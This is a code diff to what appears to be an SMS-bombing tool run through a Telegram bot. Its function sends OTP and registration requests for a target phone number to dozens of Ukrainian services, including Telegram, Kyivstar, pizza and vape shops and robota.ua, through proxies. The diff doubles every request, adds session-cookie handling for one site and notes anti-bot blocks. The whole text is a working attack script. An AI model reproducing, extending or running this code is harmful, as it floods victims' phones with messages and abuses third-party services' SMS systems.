@@ -1268,6 +1268,13 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
             # Для smaki-maki використовуємо більший таймаут (30 секунд)
             timeout_seconds = 30 if 'smaki-maki.com' in url else 5
             timeout = aiohttp.ClientTimeout(total=timeout_seconds)
+            
+            # Логування для smaki-maki перед запитом
+            if 'smaki-maki.com' in url:
+                logging.info(f"smaki-maki: починаю запит до {url}")
+                logging.info(f"smaki-maki: cookies = {kwargs.get('cookies', {})}")
+                logging.info(f"smaki-maki: data = {kwargs.get('data', {})}")
+            
             async with aiohttp.ClientSession(timeout=timeout) as session:
                 method = kwargs.pop('method', 'POST')
                 # sanitize encodings to avoid brotli dependency
@@ -1277,24 +1284,43 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
                 except Exception:
                     pass
                 kwargs['headers'] = hdrs
+                
+                if 'smaki-maki.com' in url:
+                    logging.info(f"smaki-maki: виконую {method} запит...")
+                
                 async with session.request(method, url, **kwargs) as response:
                     # Спеціальне логування для smaki-maki
                     if 'smaki-maki.com' in url:
+                        logging.info(f"smaki-maki: отримано відповідь, статус {response.status}")
                         try:
                             response_text = await response.text()
-                            logging.info(f"smaki-maki відповідь (статус {response.status}): {response_text[:200]}")
-                        except:
-                            pass
+                            logging.info(f"smaki-maki відповідь (статус {response.status}): {response_text[:500]}")
+                            if response.status == 200:
+                                logging.info(f"Успіх - {number} (smaki-maki)")
+                        except Exception as e:
+                            logging.error(f"smaki-maki: помилка читання відповіді: {e}")
+                        return  # Не логуємо звичайний успіх для smaki-maki тут
+                    
                     if response.status == 200:
                         logging.info(f"Успіх - {number}")
                     elif 'smaki-maki.com' in url:
                         logging.warning(f"smaki-maki повернув статус {response.status}")
         except asyncio.TimeoutError:
-            logging.error(f"Таймаут при запиті до {url}")
+            if 'smaki-maki.com' in url:
+                logging.error(f"Таймаут при запиті до {url} після {timeout_seconds} секунд")
+                logging.error("smaki-maki: можливі причини - сервер не відповідає, Cloudflare блокує, або потрібен cf-turnstile-response токен")
+            else:
+                logging.error(f"Таймаут при запиті до {url}")
         except aiohttp.ClientError as e:
-            logging.error(f"Помилка підключення до {url}: {e}")
+            if 'smaki-maki.com' in url:
+                logging.error(f"smaki-maki: помилка підключення до {url}: {e}")
+            else:
+                logging.error(f"Помилка підключення до {url}: {e}")
         except Exception as e:
-            logging.error(f"Невідома помилка при запиті до {url}: {e}")
+            if 'smaki-maki.com' in url:
+                logging.error(f"smaki-maki: невідома помилка при запиті до {url}: {e}")
+            else:
+                logging.error(f"Невідома помилка при запиті до {url}: {e}")
 
     semaphore = asyncio.Semaphore(3)  # Зменшено до 3 одночасних запитів
 
@@ -1310,7 +1336,8 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
             kwargs.update({"proxy": proxy_url, "proxy_auth": proxy_auth})
         return kwargs
 
-    tasks = [
+    # Створюємо список всіх перших запитів
+    first_requests = [
         bounded_request("https://my.telegram.org/auth/send_password", **with_proxy({"data": {"phone": "+" + number}, "headers": headers})),
         bounded_request("https://helsi.me/api/healthy/v2/accounts/login", **with_proxy({"json": {"phone": number, "platform": "PISWeb"}, "headers": headers})),
         bounded_request("https://auth.multiplex.ua/login", **with_proxy({"json": {"login": "+" + number}, "headers": headers})),
@@ -1349,17 +1376,69 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
         bounded_request("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", **with_proxy({"json": {"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, "headers": headers})),
     ]
     
-    # Додаємо smaki-maki окремо з логуванням
+    # Створюємо список других запитів (в тому ж порядку)
+    second_requests = [
+        bounded_request("https://my.telegram.org/auth/send_password", **with_proxy({"data": {"phone": "+" + number}, "headers": headers})),
+        bounded_request("https://helsi.me/api/healthy/v2/accounts/login", **with_proxy({"json": {"phone": number, "platform": "PISWeb"}, "headers": headers})),
+        bounded_request("https://auth.multiplex.ua/login", **with_proxy({"json": {"login": "+" + number}, "headers": headers})),
+        bounded_request("https://api.pizzaday.ua/api/V1/user/sendCode", **with_proxy({"json": {"applicationSend": "sms", "lang": "uk", "phone": number}, "headers": headers})),
+        bounded_request("https://stationpizza.com.ua/api/v1/auth/phone-auth", **with_proxy({"json": {"needSubscribeForNews": "false", "phone": formatted_number}, "headers": headers})),
+        bounded_request("https://core.takeuseat.in.ua/auth/user/requestSMSVerification", **with_proxy({"json": {"phone": "+" + number}, "headers": headers})),
+        bounded_request("https://aurum.in.ua/local/ajax/authorize.php?lang=ua", **with_proxy({"json": {"phone": formatted_number, "type": ""}, "headers": headers})),
+        bounded_request("https://pizza-time.eatery.club/site/v1/pre-login", **with_proxy({"json": {"phone": number}, "headers": headers})),
+        bounded_request("https://iq-pizza.eatery.club/site/v1/pre-login", **with_proxy({"json": {"phone": number}, "headers": headers})),
+        bounded_request("https://dnipro-m.ua/ru/phone-verification/", **with_proxy({"json": {"phone": number}, "headers": headers_dnipro, "cookies": cookies_dnipro})),
+        bounded_request("https://my.ctrs.com.ua/api/auth/login", **with_proxy({"json": {"identity": "+" + number}, "headers": headers_citrus, "cookies": cookies_citrus})),
+        bounded_request("https://auth.easypay.ua/api/check", **with_proxy({"json": {"phone": number}, "headers": headers_easypay})),
+        bounded_request("https://sandalini.ua/ru/signup/", **with_proxy({"data": {"data[firstname]": "деня", "data[phone]": formatted_number2, "wa_json_mode": "1", "need_redirects  ": "1", "contact_type": "person"}, "headers": headers})),
+        bounded_request("https://uvape.pro/index.php?route=account/register/add", **with_proxy({"data": {"firstname": "деня", "telephone": formatted_number3, "email": "random@gmail.com", "password": "VHHsq6b#v.q>]Fk"}, "headers": headers_uvape, "cookies": cookies_uvape})),
+        bounded_request("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", **with_proxy({"data": {"phone": formatted_number4, "only_sms": "1"}, "headers": headers})),
+        bounded_request("https://terra-vape.com.ua/index.php?route=common/modal_register/register_validate", **with_proxy({"data": {"firstname": "деня", "lastname": "деневич", "email": "randi@gmail.com", "telephone": number, "password": "password24-", "smscode": "", "step": "first_step"}, "headers": headers_terravape, "cookies": cookies_terravape})),
+        bounded_request("https://im.comfy.ua/api/auth/v3/otp/send", **with_proxy({"json": {"phone": number}, "headers": headers})),
+        bounded_request("https://www.moyo.ua/identity/registration", **with_proxy({"data": {"firstname": "деня", "phone": formatted_number5, "email": "rando@gmail.com"}, "headers": headers_moyo, "cookies": cookies_moyo})),
+        bounded_request("https://pizza.od.ua/ajax/reg.php", **with_proxy({"data": {"phone": formatted_number4}, "headers": headers})),
+        bounded_request("https://sushiya.ua/ru/api/v1/user/auth", **with_proxy({"data": {"phone": number[2:], "need_skeep": ""}, "headers": headers_sushiya})),
+        bounded_request("https://avrora.ua/index.php?dispatch=otp.send", **with_proxy({"data": {"phone": formatted_number6, "security_hash": "0dc890802de67228597af47d95a7f52b", "is_ajax": "1"}, "headers": headers})),
+        bounded_request("https://zolotakraina.ua/ua/turbosms/verification/code", **with_proxy({"data": {"telephone": number, "email": "rando@gmail.com", "form_key": "PKRxVkPlQqBlb8Wi"}, "headers": headers_zolota, "cookies": cookies_zolota})),
+        bounded_request("https://auto.ria.com/iframe-ria-login/registration/2/4", **with_proxy({"data": {"_csrf": csrf_token, "RegistrationForm[email]": f"{number}", "RegistrationForm[name]": "деня", "RegistrationForm[second_name]": "деневич", "RegistrationForm[agree]": "1", "RegistrationForm[need_sms]": "1"}, "headers": headers_avtoria, "cookies": cookies_avtoria})),
+        bounded_request(f"https://ukrpas.ua/login?phone=+{number}", **with_proxy({"method": 'GET', "headers": headers})),
+        bounded_request("https://maslotom.com/api/index.php?route=api/account/phoneLogin", **with_proxy({"data": {"phone": formatted_number6}, "headers": headers})),
+        bounded_request("https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua", **with_proxy({"json": {"phone": "+" + number}, "headers": headers})),
+        bounded_request("https://getvape.com.ua/index.php?route=extension/module/regsms/sendcode", **with_proxy({"data": {"telephone": formatted_number7}, "headers": headers})),
+        bounded_request("https://api.iqos.com.ua/v1/auth/otp", **with_proxy({"json": {"phone": number}, "headers": headers})),
+        bounded_request(f"https://llty-api.lvivkholod.com/api/client/{number}", **with_proxy({"method": 'POST', "headers": headers})),
+        bounded_request("https://api-mobile.planetakino.ua/graphql", **with_proxy({"json": {"query": "mutation customerVerifyByPhone($phone: String!) { customerVerifyByPhone(phone: $phone) { isRegistered }}", "variables": {"phone": "+" + number}}, "headers": headers})),
+        bounded_request("https://back.trofim.com.ua/api/via-phone-number", **with_proxy({"json": {"phone": number}, "headers": headers})),
+        bounded_request("https://dracula.robota.ua/?q=SendOtpCode", **with_proxy({"json": {"operationName": "SendOtpCode", "query": "mutation SendOtpCode($phone: String!) {  users {    login {      otpLogin {        sendConfirmation(phone: $phone) {          status          remainingAttempts          __typename        }        __typename      }      __typename    }    __typename  }}", "variables": {"phone": number}}, "headers": headers})),
+        bounded_request(f"https://shop.kyivstar.ua/api/v2/otp_login/send/{number[2:]}", **with_proxy({"method": 'GET', "headers": headers})),
+        bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", **with_proxy({"data": {"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "code"}, "headers": headers_elmir, "cookies": cookies_elmir})),
+        bounded_request(f"https://bars.itbi.com.ua/smart-cards-api/common/users/otp?lang=uk&phone={number}", **with_proxy({"method": 'GET', "headers": headers})),
+        bounded_request("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", **with_proxy({"json": {"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, "headers": headers})),
+    ]
+    
+    # Додаємо smaki-maki: перший запит в початок, другий в кінець
+    smaki_first = None
+    smaki_second = None
     if smaki_session_id:
-        # Генеруємо випадкове ім'я з англійських букв (5-10 символів)
+        # Генеруємо випадкове ім'я з англійських букв (5-10 символів) для першого запиту
         random_name_length = random.randint(5, 10)
         random_name = ''.join(random.choices(string.ascii_letters, k=random_name_length))
-        logging.info(f"Додаю запит до smaki-maki з OCSESSID: {smaki_session_id[:10]}... та номером: {formatted_number2}, ім'я: {random_name}")
-        tasks.append(
-            bounded_request("https://smaki-maki.com/index.php?route=extension/module/login_telephone/sms", **with_proxy({"data": {"phone": formatted_number2, "name": random_name, "passwords": "", "redirect_from": "https://smaki-maki.com/", "show[phone]": "true"}, "headers": headers_smaki, "cookies": smaki_cookies_final}))
-        )
+        logging.info(f"Додаю перший запит до smaki-maki з OCSESSID: {smaki_session_id[:10]}... та номером: {formatted_number2}, ім'я: {random_name}")
+        smaki_first = bounded_request("https://smaki-maki.com/index.php?route=extension/module/login_telephone/sms", **with_proxy({"data": {"phone": formatted_number2, "name": random_name, "passwords": "", "redirect_from": "https://smaki-maki.com/", "show[phone]": "true"}, "headers": headers_smaki, "cookies": smaki_cookies_final}))
+        
+        # Генеруємо випадкове ім'я для другого запиту
+        random_name_length2 = random.randint(5, 10)
+        random_name2 = ''.join(random.choices(string.ascii_letters, k=random_name_length2))
+        logging.info(f"Додаю другий запит до smaki-maki з OCSESSID: {smaki_session_id[:10]}... та номером: {formatted_number2}, ім'я: {random_name2}")
+        smaki_second = bounded_request("https://smaki-maki.com/index.php?route=extension/module/login_telephone/sms", **with_proxy({"data": {"phone": formatted_number2, "name": random_name2, "passwords": "", "redirect_from": "https://smaki-maki.com/", "show[phone]": "true"}, "headers": headers_smaki, "cookies": smaki_cookies_final}))
     else:
         logging.warning("smaki-maki: не вдалося отримати OCSESSID, пропускаю запит")
+    
+    # Об'єднуємо: smaki-maki перший, потім всі перші запити, потім всі другі, потім smaki-maki другий
+    if smaki_first and smaki_second:
+        tasks = [smaki_first] + first_requests + second_requests + [smaki_second]
+    else:
+        tasks = first_requests + second_requests
 
     if not attack_flags.get(chat_id):
         return
